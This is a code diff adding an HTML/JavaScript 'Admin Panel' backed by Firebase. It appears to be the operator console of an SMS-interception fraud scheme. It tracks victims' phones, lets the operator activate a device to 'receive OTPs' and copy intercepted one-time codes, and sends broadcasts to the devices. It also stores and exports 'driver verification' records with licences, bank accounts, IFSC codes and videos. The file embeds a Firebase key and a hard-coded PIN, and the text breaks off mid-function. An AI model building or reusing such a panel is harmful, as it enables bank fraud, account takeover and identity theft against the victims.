@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Admin Panel</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+body { background: #eef1f4; color: #111827; min-height: 100vh; }
+button { font-family: inherit; }
+.login-screen { position: fixed; inset: 0; background: #0b0d10; display: flex; justify-content: center; align-items: center; z-index: 2000; }
+.login-box { background: #fff; padding: 36px 28px; border-radius: 20px; max-width: 380px; width: 90%; text-align: center; }
+.login-box h2 { margin-bottom: 6px; font-size: 22px; }
+.login-box p { color: #6b7280; margin-bottom: 22px; font-size: 14px; }
+.login-input { width: 100%; padding: 14px; border: 1px solid #dfe3e8; border-radius: 12px; font-size: 18px; margin-bottom: 14px; text-align: center; letter-spacing: 6px; outline: none; }
+.login-btn { width: 100%; padding: 14px; background: #111; color: #fff; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; }
+.login-error { color: #d32f2f; font-size: 13px; margin-bottom: 12px; display: none; }
+.app-shell { max-width: 720px; margin: 0 auto; }
+.top-bar { display: flex; justify-content: space-between; align-items: center; padding: 22px 16px 10px; }
+.top-bar h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.6px; }
+.top-sub { font-size: 12px; color: #8b93a0; margin-top: 2px; }
+.icon-btn { background: #fff; border: none; width: 40px; height: 40px; border-radius: 12px; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 1px 3px rgba(16,24,40,.08); color: #4b5563; }
+.icon-btn svg { width: 18px; height: 18px; }
+.content { padding: 6px 16px 96px; }
+.tab-page[hidden] { display: none; }
+.card { background: #fff; border-radius: 16px; box-shadow: 0 1px 3px rgba(16,24,40,.07); margin-bottom: 16px; overflow: hidden; }
+.card-head { display: flex; align-items: center; gap: 10px; padding: 16px; font-size: 16px; font-weight: 700; }
+.card-head svg { width: 20px; height: 20px; color: #111; flex-shrink: 0; }
+.stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 16px; }
+.stat-card { background: #fff; border-radius: 14px; padding: 12px 10px; text-align: center; box-shadow: 0 1px 3px rgba(16,24,40,.07); }
+.stat-value { font-size: 22px; font-weight: 800; }
+.stat-label { font-size: 10px; color: #8b93a0; text-transform: uppercase; letter-spacing: .6px; margin-top: 2px; font-weight: 600; }
+.session-row { display: flex; align-items: center; gap: 12px; padding: 14px 16px; border-top: 1px solid #f1f3f6; }
+.session-icon { width: 42px; height: 42px; border-radius: 11px; background: #e4edfb; color: #4a7dfc; display: flex; justify-content: center; align-items: center; flex-shrink: 0; }
+.session-icon svg { width: 20px; height: 20px; }
+.session-icon.green { background: #e5f6ec; color: #1a9e55; }
+.row-info { flex: 1; min-width: 0; }
+.row-title { font-size: 15px; font-weight: 700; color: #111827; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.row-sub { font-size: 12.5px; color: #8b93a0; margin-top: 3px; line-height: 1.45; }
+.chev { color: #c3c9d2; font-size: 20px; flex-shrink: 0; }
+.kill-btn { width: 38px; height: 38px; border-radius: 11px; background: #fdeaea; color: #d64545; border: none; font-size: 15px; font-weight: 700; cursor: pointer; flex-shrink: 0; display: flex; justify-content: center; align-items: center; }
+.row-clickable { cursor: pointer; }
+.row-clickable:active { background: #f8f9fb; }
+.search-wrap { margin-bottom: 14px; }
+.search-input { width: 100%; padding: 13px 16px; border: none; border-radius: 14px; font-size: 14px; background: #fff; outline: none; box-shadow: 0 1px 3px rgba(16,24,40,.07); }
+.back-btn { background: none; border: none; color: #4a7dfc; font-size: 14px; font-weight: 600; cursor: pointer; padding: 4px 0 12px; }
+.avatar { width: 42px; height: 42px; border-radius: 50%; background: #111; color: #fff; display: flex; justify-content: center; align-items: center; font-weight: 700; font-size: 16px; flex-shrink: 0; }
+.composer-body { padding: 0 16px 16px; }
+.composer-body select, .composer-body textarea { width: 100%; border: 1px solid #dfe3e8; border-radius: 12px; padding: 12px 14px; font-size: 14px; margin-bottom: 12px; outline: none; font-family: inherit; background: #fff; }
+.composer-body textarea { min-height: 110px; resize: vertical; }
+.btn-primary { width: 100%; padding: 14px; background: #111; color: #fff; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; }
+.bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: #fff; border-top: 1px solid #e6e9ee; display: flex; z-index: 900; padding-bottom: env(safe-area-inset-bottom); }
+.nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; gap: 4px; padding: 10px 0 9px; background: none; border: none; cursor: pointer; color: #9aa1ab; font-size: 11px; font-weight: 600; }
+.nav-item svg { width: 22px; height: 22px; }
+.nav-item.active { color: #111; }
+.modal-overlay { display: none; position: fixed; inset: 0; background: rgba(10,12,16,.55); z-index: 1500; justify-content: center; align-items: flex-end; }
+.modal-overlay.active { display: flex; }
+.modal-sheet { background: #f4f6f8; width: 100%; max-width: 720px; max-height: 92vh; border-radius: 22px 22px 0 0; overflow-y: auto; animation: slideUp .25s ease; }
+@keyframes slideUp { from { transform: translateY(40px); opacity: .5; } to { transform: translateY(0); opacity: 1; } }
+.modal-head { position: sticky; top: 0; background: #fff; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eceff2; z-index: 5; }
+.modal-head h2 { font-size: 17px; font-weight: 800; }
+.close-modal { background: #f1f3f6; border: none; width: 32px; height: 32px; border-radius: 50%; font-size: 15px; cursor: pointer; color: #4b5563; }
+.modal-body { padding: 16px; }
+.modal-body .card { margin-bottom: 14px; }
+.sec-title { font-size: 12px; font-weight: 700; color: #8b93a0; text-transform: uppercase; letter-spacing: 1px; padding: 14px 16px 6px; }
+.info-row { display: flex; justify-content: space-between; gap: 12px; padding: 10px 16px; border-top: 1px solid #f1f3f6; font-size: 14px; }
+.info-row:first-of-type { border-top: none; }
+.info-label { color: #6b7280; flex-shrink: 0; }
+.info-value { font-weight: 600; text-align: right; word-break: break-all; }
+.video-card { padding: 12px 16px 16px; border-top: 1px solid #f1f3f6; }
+.video-card video { width: 100%; border-radius: 12px; background: #000; max-height: 320px; }
+.video-actions { display: flex; gap: 8px; margin-top: 10px; }
+.btn-dark { flex: 1; padding: 11px; background: #111; color: #fff; border: none; border-radius: 10px; font-size: 13px; font-weight: 600; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 6px; }
+.btn-light { flex: 1; padding: 11px; background: #f1f3f6; color: #111; border: none; border-radius: 10px; font-size: 13px; font-weight: 600; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 6px; }
+.btn-zip { flex: 2; padding: 11px; background: #4a7dfc; color: #fff; border: none; border-radius: 10px; font-size: 13px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 6px; }
+.btn-zip:disabled { background: #999; cursor: not-allowed; }
+.no-video { padding: 16px; text-align: center; color: #9aa1ab; font-size: 13px; border-top: 1px solid #f1f3f6; }
+.modal-actions { display: flex; gap: 8px; padding: 0 16px 16px; }
+.raw-box { margin: 0 16px 16px; background: #f1f3f6; border-radius: 10px; padding: 10px; font-size: 11px; color: #6b7280; word-break: break-all; line-height: 1.5; }
+.btn-danger-ghost { width: 100%; padding: 13px; background: #fff; color: #d64545; border: 1px solid #f3caca; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; }
+.btn-ghost { width: 100%; padding: 13px; background: #fff; color: #111; border: 1px solid #dfe3e8; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
+.empty-state { text-align: center; padding: 50px 20px; color: #8b93a0; }
+.empty-state h3 { color: #111; font-size: 17px; margin-bottom: 6px; }
+.loading-box { text-align: center; padding: 40px; color: #8b93a0; font-size: 14px; }
+.badge-live { display: inline-flex; align-items: center; gap: 5px; background: #e5f6ec; color: #1a9e55; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 20px; letter-spacing: .5px; }
+.badge-live .dot { width: 6px; height: 6px; background: #1a9e55; border-radius: 50%; animation: blink 1.4s infinite; }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+.toast { position: fixed; left: 50%; bottom: 92px; transform: translateX(-50%) translateY(16px); background: #111; color: #fff; padding: 11px 20px; border-radius: 24px; font-size: 13px; font-weight: 600; opacity: 0; pointer-events: none; transition: .25s; z-index: 3000; max-width: 84%; text-align: center; box-shadow: 0 6px 20px rgba(0,0,0,.25); }
+.toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+/* OTP Specific */
+.otp-card { background: #fff; border-radius: 12px; padding: 14px; margin-bottom: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); border-left: 4px solid #4a7dfc; position: relative; }
+.otp-sender { font-size: 12px; color: #6b7280; font-weight: 600; margin-bottom: 4px; text-transform: uppercase;}
+.otp-msg { font-size: 15px; color: #111; font-weight: 500; line-height: 1.4; margin-bottom: 10px; }
+.otp-time { font-size: 11px; color: #9aa1ab; }
+.copy-otp-btn { position: absolute; right: 14px; bottom: 14px; background: #111; color: #fff; border: none; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; }
+.badge-active { background: #1a9e55; color: #fff; font-size: 10px; padding: 3px 8px; border-radius: 10px; margin-left: 8px; font-weight: bold; vertical-align: middle; }
+</style>
+</head>
+<body>
+
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h2>Admin Panel</h2>
+    <p>Enter PIN to unlock dashboard</p>
+    <div class="login-error" id="loginError">Incorrect PIN</div>
+    <input type="password" class="login-input" id="pinInput" placeholder="••••" maxlength="6" inputmode="numeric">
+    <button class="login-btn" onclick="doLogin()">Unlock</button>
+  </div>
+</div>
+
+<div class="app-shell" id="appShell" style="display:none;">
+  <div class="top-bar">
+    <div>
+      <h1 id="pageTitle">Dashboard</h1>
+      <div class="top-sub"><span class="badge-live"><span class="dot"></span>LIVE</span> &nbsp;<span id="pageSub">Connected to Firebase</span></div>
+    </div>
+    <button class="icon-btn" onclick="refreshData()" title="Refresh">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+    </button>
+  </div>
+
+  <main class="content">
+    <!-- Dashboard -->
+    <section class="tab-page" id="page-dashboard">
+      <div class="stats-grid">
+        <div class="stat-card"><div class="stat-value" id="statTotal">0</div><div class="stat-label">Total</div></div>
+        <div class="stat-card"><div class="stat-value" id="statToday">0</div><div class="stat-label">Today</div></div>
+        <div class="stat-card"><div class="stat-value" id="statVideos">0</div><div class="stat-label">Videos</div></div>
+        <div class="stat-card"><div class="stat-value" id="statDevices">0</div><div class="stat-label">Devices</div></div>
+      </div>
+      <div class="card">
+        <div class="card-head">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 11.5 11 13.5 15 9.5"/></svg>
+          <span>Active Sessions <span id="sessionsCount">(0)</span></span>
+        </div>
+        <div id="sessionsList"><div class="loading-box">Loading sessions...</div></div>
+      </div>
+    </section>
+
+    <!-- Devices & OTPs -->
+    <section class="tab-page" id="page-devices" hidden>
+      <div id="devicesView"></div>
+    </section>
+
+    <!-- Messages -->
+    <section class="tab-page" id="page-messages" hidden>
+      <div class="search-wrap"><input class="search-input" id="msgSearch" placeholder="Search name, mobile..." oninput="renderMessages()"></div>
+      <div class="card">
+        <div class="card-head">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+          <span>Submissions <span id="msgCount">(0)</span></span>
+        </div>
+        <div id="messagesList"></div>
+      </div>
+    </section>
+
+    <!-- Send Broadcast -->
+    <section class="tab-page" id="page-send" hidden>
+      <div class="card">
+        <div class="card-head">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3H6a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3h12a3 3 0 0 0 3-3 3 3 0 0 0-3-3z"/></svg>
+          <span>Broadcast Message</span>
+        </div>
+        <div class="composer-body">
+          <select id="sendTarget"></select>
+          <textarea id="sendText" placeholder="Type your broadcast message..."></textarea>
+          <button class="btn-primary" onclick="sendBroadcast()">📢 Send Broadcast</button>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-head">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11 2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/></svg>
+          <span>Sent Broadcasts <span id="broadcastCount">(0)</span></span>
+        </div>
+        <div id="broadcastList"></div>
+      </div>
+    </section>
+  </main>
+
+  <nav class="bottom-nav">
+    <button class="nav-item active" data-tab="dashboard" onclick="switchTab('dashboard')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>Dash
+    </button>
+    <button class="nav-item" data-tab="devices" onclick="switchTab('devices')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>Devices
+    </button>
+    <button class="nav-item" data-tab="messages" onclick="switchTab('messages')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>Msgs
+    </button>
+    <button class="nav-item" data-tab="send" onclick="switchTab('send')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>Send
+    </button>
+  </nav>
+</div>
+
+<div class="modal-overlay" id="detailModal">
+  <div class="modal-sheet">
+    <div class="modal-head">
+      <h2 id="modalTitle">Details</h2>
+      <button class="close-modal" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyCyh5A03JHvu--80RZYmf6g_FHXXkhbIaM",
+  authDomain: "himanshu-9e9a7.firebaseapp.com",
+  databaseURL: "https://himanshu-9e9a7-default-rtdb.firebaseio.com",
+  projectId: "himanshu-9e9a7",
+  storageBucket: "himanshu-9e9a7.firebasestorage.app",
+  messagingSenderId: "439997480267",
+  appId: "1:439997480267:web:6e48e59f91b4c5ddb33cce"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const ADMIN_PIN = '1234';
+const SESSION_EXPIRY_MS = 30 * 24 * 60 * 60 * 1000;
+
+let allEntries = [], broadcasts = [], allOtps = {}, devicesList = {};
+let currentTab = 'dashboard', currentDetail = null, selectedDeviceId = null;
+let currentDeviceView = null; // For Device Detail Page
+
+const ICON_PHONE = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>';
+
+let toastTimer;
+function showToast(msg){
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => t.classList.remove('show'), 3200);
+}
+
+function esc(s){ return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function fmt(ts){ return ts ? new Date(ts).toLocaleString('en-GB') : '-'; }
+function parseBrowserOS(ua){
+    ua = ua || '';
+    let b = 'Browser';
+    if (/Edg\//.test(ua)) b = 'Edge'; else if (/OPR\//.test(ua)) b = 'Opera';
+    else if (/Chrome\//.test(ua)) b = 'Chrome'; else if (/Firefox\//.test(ua)) b = 'Firefox';
+    else if (/Safari\//.test(ua)) b = 'Safari';
+    let o = 'Unknown';
+    if (/Android/.test(ua)) o = 'Android'; else if (/iPhone|iPad|iPod/.test(ua)) o = 'iOS';
+    else if (/Windows/.test(ua)) o = 'Windows'; else if (/Macintosh/.test(ua)) o = 'macOS';
+    else if (/Linux/.test(ua)) o = 'Linux';
+    return b + ' · ' + o;
+}
+
+function saveBlob(blob, filename){
+    const obj = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = obj; a.download = filename; a.style.display = 'none';
+    document.body.appendChild(a); a.click();
+    setTimeout(() => { URL.revokeObjectURL(obj); a.remove(); }, 5000);
+}
+
+document.getElementById('pinInput').addEventListener('keypress', e => { if (e.key === 'Enter') doLogin(); });
+function doLogin(){
+    if (document.getElementById('pinInput').value === ADMIN_PIN) {
+        document.getElementById('loginScreen').style.display = 'none';
+        document.getElementById('appShell').style.display = 'block';
+        startListeners();
+    } else {
+        document.getElementById('loginError').style.display = 'block';
+        document.getElementById('pinInput').value = '';
+    }
+}
+
+let listenersStarted = false;
+function startListeners(){
+    if (listenersStarted) return;
+    listenersStarted = true;
+    
+    db.ref('verifications').on('value', snap => {
+        const val = snap.val() || {};
+        allEntries = Object.entries(val).map(([id, v]) => ({ id, ...v })).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        renderCurrentTab();
+    });
+    db.ref('broadcasts').on('value', snap => {
+        const val = snap.val() || {};
+        broadcasts = Object.entries(val).map(([id, v]) => ({ id, ...v })).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        if (currentTab === 'send') renderSend();
+    });
+    db.ref('devices').on('value', snap => {
+        devicesList = snap.val() || {};
+        if(currentTab === 'devices') renderDevices();
+    });
+    db.ref('selected_device').on('value', snap => {
+        selectedDeviceId = snap.val();
+        if(currentTab === 'devices') renderDevices();
+    });
+    db.ref('otps').on('value', snap => {
+        allOtps = snap.val() || {};
+        if(currentTab === 'devices') renderDevices();
+    });
+}
+
+function refreshData(){ showToast('↻ Refreshing...'); setTimeout(()=>showToast('✅ Up to date'), 800); }
+
+function switchTab(tab){
+    currentTab = tab;
+    if(tab !== 'devices') currentDeviceView = null; // Reset device view when leaving tab
+    document.querySelectorAll('.nav-item').forEach(b => b.classList.toggle('active', b.dataset.tab === tab));
+    ['dashboard','devices','messages','send'].forEach(t => document.getElementById('page-' + t).hidden = (t !== tab));
+    document.getElementById('pageTitle').textContent = { dashboard:'Dashboard', devices:'Devices & OTPs', messages:'Messages', send:'Send' }[tab];
+    renderCurrentTab();
+}
+
+function renderCurrentTab(){
+    if (currentTab === 'dashboard') renderDashboard();
+    else if (currentTab === 'devices') renderDevices();
+    else if (currentTab === 'messages') renderMessages();
+    else renderSend();
+}
+
+// ==================== DASHBOARD ====================
+function renderDashboard(){
+    document.getElementById('statTotal').textContent = allEntries.length;
+    const today = new Date().toDateString();
+    document.getElementById('statToday').textContent = allEntries.filter(e => new Date(e.timestamp).toDateString() === today).length;
+    document.getElementById('statVideos').textContent = allEntries.filter(e => e.video1Url || e.video2Url).length;
+    document.getElementById('statDevices').textContent = Object.keys(devicesList).length;
+    
+    document.getElementById('sessionsCount').textContent = '(' + allEntries.length + ')';
+    const list = document.getElementById('sessionsList');
+    if (!allEntries.length) { list.innerHTML = '<div class="empty-state"><h3>No active sessions</h3></div>'; return; }
+    
+    list.innerHTML = allEntries.map(e => `
+        <div class="session-row row-clickable" onclick="openDetail('${e.id}')">
+            <div class="session-icon">${ICON_PHONE}</div>
+            <div class="row-info">
+                <div class="row-title">${esc(parseBrowserOS(e.rawDevice))}</div>
+                <div class="row-sub">Last seen: ${fmt(e.timestamp)}</div>
+            </div>
+            <button class="kill-btn" onclick="event.stopPropagation(); killSession('${e.id}')">✕</button>
+        </div>`).join('');
+}
+function killSession(id){ if (confirm('Remove this session and delete its data?')) db.ref('verifications/' + id).remove(); }
+
+// ==================== DEVICES & OTPs ====================
+function renderDevices() {
+    const view = document.getElementById('devicesView');
+    
+    // Inner View: A specific Device is opened
+    if (currentDeviceView) {
+        const devId = currentDeviceView;
+        const dev = devicesList[devId] || { model: 'Unknown Device', last_seen: 0 };
+        const isActive = (selectedDeviceId === devId);
+        
+        // Filter OTPs for this device
+        let otpList = allOtps[devId] || {};
+        let otpArray = Object.entries(otpList).map(([id, v]) => ({id, ...v})).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        
+        // Filter Verifications (logs) for this device model
+        const logs = allEntries.filter(e => (e.device || 'Unknown Device') === dev.model);
+
+        let html = `
+            <button class="back-btn" onclick="backToDeviceList()">‹ All Devices</button>
+            
+            <!-- Device Control Card -->
+            <div class="card" style="margin-bottom: 20px;">
+                <div class="card-head" style="background:#f8f9fa; padding-bottom:10px;">
+                    ${ICON_PHONE}
+                    <div>
+                        <span style="font-size:18px;">${esc(dev.model)}</span>
+                        ${isActive ? '<span class="badge-active">ACTIVE</span>' : ''}
+                    </div>
+                </div>
+                <div style="padding: 12px 16px 16px;">
+                    <div class="row-sub" style="margin-bottom: 14px; font-family: monospace; font-size:13px; color:#4a7dfc; font-weight:700;">ID: ${esc(devId)}</div>
+                    ${isActive 
+                        ? `<button class="btn-light" style="width:100%; color:#d64545; padding:14px; font-size:14px;" onclick="deactivateDevice()">🛑 Stop OTPs for this Device</button>`
+                        : `<button class="btn-primary" style="width:100%; padding:14px; font-size:14px;" onclick="activateDevice('${devId}')">🔓 Open & Receive OTPs</button>`
+                    }
+                </div>
+            </div>
+
+            <!-- Live OTPs Section -->
+            <div class="sec-title" style="padding-left:0; margin-bottom:8px; font-size:14px;">🔴 LIVE OTPs (${otpArray.length})</div>
+            <div style="margin-bottom: 24px;">
+        `;
+        
+        if (otpArray.length === 0) {
+            html += `<div class="empty-state" style="padding: 20px; background:#fff; border-radius:12px;"><p>No OTPs received yet.</p></div>`;
+        } else {
+            html += otpArray.map(o => `
+                <div class="otp-card">
+                    <div class="otp-sender">From: ${esc(o.sender)}</div>
+                    <div class="otp-msg">${esc(o.message)}</div>
+                    <div class="otp-time">${fmt(o.timestamp)}</div>
+                    <button class="copy-otp-btn" onclick="copyOtp('${esc(o.message).replace(/'/g, "\\'")}')">📋 Copy</button>
+                </div>
+            `).join('');
+        }
+        html += `</div>`;
+
+        // Verification Logs Section
+        html += `<div class="sec-title" style="padding-left:0; margin-bottom:8px; font-size:14px;">📄 Verification Logs (${logs.length})</div>`;
+        
+        if (logs.length === 0) {
+            html += `<div class="empty-state" style="padding: 20px; background:#fff; border-radius:12px;"><p>No verification logs for this model.</p></div>`;
+        } else {
+            html += logs.map(e => `
+                <div class="session-row row-clickable" onclick="openDetail('${e.id}')" style="background:#fff; border-radius:12px; margin-bottom:8px; border:1px solid #f1f3f6;">
+                    <div class="avatar">${esc((e.name||'?').charAt(0).toUpperCase())}</div>
+                    <div class="row-info">
+                        <div class="row-title">${esc(e.name || 'Unknown')}</div>
+                        <div class="row-sub">${esc(e.mobile || '—')} · ${fmt(e.timestamp)}</div>
+                    </div>
+                    <span class="chev">›</span>
+                </div>`).join('');
+        }
+
+        view.innerHTML = html;
+        return;
+    }
+
+    // Main Device List View
+    let keys = Object.keys(devicesList).sort((a,b) => (devicesList[b].last_seen||0) - (devicesList[a].last_seen||0));
+    
+    if (!keys.length) {
+        view.innerHTML = '<div class="empty-state"><h3>No Devices Online</h3><p>Open the app on a phone to connect.</p></div>';
+        return;
+    }
+
+    view.innerHTML = keys.map(devId => {
+        const d = devicesList[devId];
+        const isActive = (selectedDeviceId === devId);
+        const otpCount = allOtps[devId] ? Object.keys(allOtps[devId]).length : 0;
+        
+        return `
+            <div class="card row-clickable" style="display:flex;align-items:center;gap:12px;padding:14px 16px;" onclick="openDeviceView('${devId}')">
+                <div class="session-icon ${isActive?'green':''}">${ICON_PHONE}</div>
+                <div class="row-info">
+                    <div class="row-title">${esc(d.model)} ${isActive ? '<span class="badge-active">ACTIVE</span>' : ''}</div>
+                    <div class="row-sub" style="font-family:monospace;">ID: ${esc(devId)}</div>
+                    <div class="row-sub">${otpCount} OTP(s) received · Last seen: ${fmt(d.last_seen)}</div>
+                </div>
+                <span class="chev">›</span>
+            </div>
+        `;
+    }).join('');
+}
+
+function openDeviceView(devId) { currentDeviceView = devId; renderDevices(); }
+function backToDeviceList() { currentDeviceView = null; renderDevices(); }
+function activateDevice(id) { db.ref('selected_device').set(id).then(() => showToast('✅ Device Activated')); }
+function deactivateDevice() { db.ref('selected_device').remove().then(() => showToast('🛑 Device Deactivated')); }
+function copyOtp(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(() => showToast('📋 OTP Copied!')).catch(() => prompt('Copy OTP:', text));
+    } else { prompt('Copy OTP:', text); }
+}
+
+// ==================== MESSAGES ====================
+function renderMessages(){
+    document.getElementById('msgCount').textContent = '(' + allEntries.length + ')';
+    const box = document.getElementById('messagesList');
+    if (!allEntries.length) { box.innerHTML = '<div class="empty-state"><h3>No messages</h3></div>'; return; }
+    box.innerHTML = allEntries.map(e => `
+        <div class="session-row row-clickable" onclick="openDetail('${e.id}')">
+            <div class="avatar">${esc((e.name||'?').charAt(0).toUpperCase())}</div>
+            <div class="row-info">
+                <div class="row-title">${esc(e.name || 'Unknown')}</div>
+                <div class="row-sub">${esc(e.mobile || '—')}</div>
+            </div>
+            <span class="chev">›</span>
+        </div>`).join('');
+}
+
+// ==================== SEND BROADCAST ====================
+function renderSend(){
+    const sel = document.getElementById('sendTarget');
+    const devices = [...new Set(allEntries.map(e => e.device || 'Unknown Device'))].sort();
+    sel.innerHTML = '<option value="all">📢 All Devices</option>' + devices.map(d => `<option value="${esc(d)}">📱 ${esc(d)}</option>`).join('');
+    document.getElementById('broadcastCount').textContent = '(' + broadcasts.length + ')';
+    const box = document.getElementById('broadcastList');
+    if (!broadcasts.length) { box.innerHTML = '<div class="empty-state"><h3>No broadcasts yet</h3></div>'; return; }
+    box.innerHTML = broadcasts.map(b => `
+        <div class="session-row">
+            <div class="session-icon green">📢</div>
+            <div class="row-info">
+                <div class="row-title" style="font-weight:600;">${esc((b.message || '').slice(0,60))}</div>
+                <div class="row-sub">To: ${esc(b.target || 'all')} · ${fmt(b.timestamp)}</div>
+            </div>
+            <button class="kill-btn" onclick="deleteBroadcast('${b.id}')">✕</button>
+        </div>`).join('');
+}
+function sendBroadcast(){
+    const text = document.getElementById('sendText').value.trim();
+    if (!text) { showToast('❌ Type a message first'); return; }
+    const target = document.getElementById('sendTarget').value;
+    db.ref('broadcasts').push().set({ message: text, target, timestamp: Date.now() })
+        .then(() => { document.getElementById('sendText').value = ''; showToast('✅ Broadcast sent'); });
+}
+function deleteBroadcast(id){ if (confirm('Delete this broadcast?')) db.ref('broadcasts/' + id).remove(); }
+
+// ==================== DETAIL MODAL (Original User Details) ====================
+async function downloadFileAsBlob(url) {
+    try {
+        const res = await fetch(url, { mode: 'cors' });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return await res.blob();
+    } catch (err) {
+        return await new Promise((resolve, reject) => {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.responseType = 'blob';
+            xhr.onload = () => xhr.status === 200 ? resolve(xhr.response) : reject(new Error('XHR ' + xhr.status));
+            xhr.onerror = () => reject(new Error('Network error'));
+            xhr.send();
+        });
+    }
+}
+
+async function downloadAsZip() {
+    if (!currentDetail) return;
+    const e = currentDetail;
+    const zipBtn = document.getElementById('zipBtn');
+    if (zipBtn) { zipBtn.disabled = true; zipBtn.textContent = '⏳ Preparing ZIP...'; }
+    
+    showToast('⏳ Preparing ZIP file...');
+    
+    try {
+        const zip = new JSZip();
+        const folder = zip.folder(`${e.name || 'record'}_${e.mobile || 'unknown'}`);
+        
+        const txtContent = [
+            '===== DRIVER VERIFICATION RECORD =====',
+            'Name: ' + (e.name||'-'),
+            'Mobile: ' + (e.mobile||'-'),
+            'Licence: ' + (e.licence||'-'),
+            'Account Holder: ' + (e.holder||'-'),
+            'Wallet/Bank: ' + (e.wallet||'-'),
+            'IFSC: ' + (e.ifsc||'-'),
